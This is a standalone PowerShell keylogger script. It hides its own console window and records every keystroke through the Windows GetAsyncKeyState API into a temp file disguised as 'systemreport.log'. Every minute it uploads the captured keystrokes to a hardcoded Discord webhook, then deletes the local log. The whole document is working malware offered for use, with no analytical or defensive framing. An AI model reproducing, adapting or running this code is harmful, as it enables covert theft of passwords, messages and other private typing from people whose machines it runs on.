$hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
$logFile = "$env:Temp\systemreport.log"
$boundary = [System.Guid]::NewGuid().ToString()

# Keylogger functions
Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Hide window
[KeyLogger]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

try {
    $lastSent = Get-Date
    while ($true) {
        Start-Sleep -Milliseconds 40
        
        # Capture keystrokes
        1..254 | ForEach-Object {
            if ([KeyLogger]::GetAsyncKeyState($_) -eq -32767) {
                $key = [System.Windows.Forms.Keys]$_ | ForEach-Object {
                    if ($_ -ge 32 -and $_ -le 126) { [char]$_ }
                    else { "[" + $_.ToString() + "]" }
                }
                $key | Out-File $logFile -Append
            }
        }

        # Exfiltrate every 60 seconds
        if ((Get-Date) - $lastSent -gt [TimeSpan]::FromSeconds(60)) {
            if (Test-Path $logFile -PathType Leaf) {
                $content = Get-Content $logFile -Raw
                if (-not [string]::IsNullOrWhiteSpace($content)) {
                    $body = @(
                        "--$boundary",
                        "Content-Disposition: form-data; name=`"file`"; filename=`"keystrokes.txt`"",
                        "Content-Type: text/plain",
                        "",
                        $content,
                        "--$boundary--"
                    ) -join "`r`n"

                    try {
                        Invoke-RestMethod -Uri $hook -Method Post `
                            -ContentType "multipart/form-data; boundary=$boundary" `
                            -Body $body
                        Clear-Content $logFile
                    }
                    catch {
                        # Retry once after 10 seconds
                        Start-Sleep -Seconds 10
                        Invoke-RestMethod -Uri $hook -Method Post `
                            -ContentType "multipart/form-data; boundary=$boundary" `
                            -Body $body
                        Clear-Content $logFile
                    }
                }
            }
            $lastSent = Get-Date
        }
    }
}
finally {
    if (Test-Path $logFile) {
        Remove-Item $logFile -Force
    }
}
